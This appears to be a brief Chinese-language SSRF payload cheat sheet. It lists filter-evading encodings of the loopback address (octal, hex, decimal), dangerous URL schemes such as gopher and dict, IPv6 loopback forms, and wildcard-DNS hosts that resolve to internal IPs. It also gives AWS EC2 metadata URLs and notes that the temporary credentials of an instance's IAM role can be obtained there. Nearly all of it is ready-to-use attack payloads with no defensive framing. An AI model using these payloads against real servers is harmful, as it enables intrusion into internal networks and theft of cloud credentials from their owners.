## SSRF

```
http://0177.1/
```

```
http://0x7f.1/
```

```
http://127.000.000.1
```

```
https://520968996
```

_提示:_ Ip段可被计算出，通过  http://www.subnetmask.info/

**一些处理协议**

```
gopher://, dict://, php://, jar://, tftp://
```

**IPv6**

```
http://[::1]
```

```
http://[::]
```

**通配符 DNS**

```
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```
_Link:_ http://xip.io

```
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

_Link:_ http://nip.io

**AWS EC2 元数据**

```
http://169.254.169.254/latest/meta-data/  
```

```
http://169.254.169.254/latest/meta-data/local-hostname
```

```
http://169.254.169.254/latest/meta-data/public-hostname
```

> 如果存在与实例关联的IAM角色，则role-name是该角色的名称，role-name包含与该角色关联的临时安全凭据[…]

_Link:_ http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html (包含一个全面的实例元数据类别表)

